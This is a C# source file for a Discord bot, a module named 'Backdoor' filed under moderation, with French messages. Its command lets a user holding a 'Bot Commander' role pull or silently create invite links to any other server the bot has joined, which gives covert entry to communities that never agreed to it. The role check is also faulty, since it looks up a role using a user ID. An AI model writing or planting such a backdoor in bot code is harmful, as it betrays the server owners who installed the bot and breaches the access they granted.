using System;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;
using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace AlbaBotDiscord.Core.Moderation
{
    class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildId)
        {
            if (!(Context.Guild.GetRole(Context.User.Id).Name == "Bot Commander"))
            {
                await Context.Channel.SendMessageAsync(":rage: :rage:  Vous n'êtes pas Bot Commander. :rage: :rage:");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync("Je ne suis pas dans le serveur dont id=" + GuildId);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            try
            {
                var Invites = await Guild.GetInvitesAsync();
                if (Invites.Count() < 1)
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }

                Invites = null;
                Invites = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invitations pour {Guild.Name}:", Guild.IconUrl);
                Embed.WithColor(40, 200, 150);
                foreach (var Current in Invites)
                    Embed.AddInlineField("Invite:", $"[Invite]({Current.Url})");

                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
            catch (Exception ex)
            {
                await Context.Channel.SendMessageAsync($"La création d'une invitation pour {Guild.Name} Interrompu: ``{ex.Message}``");
                return;
            }
        }
    }
}
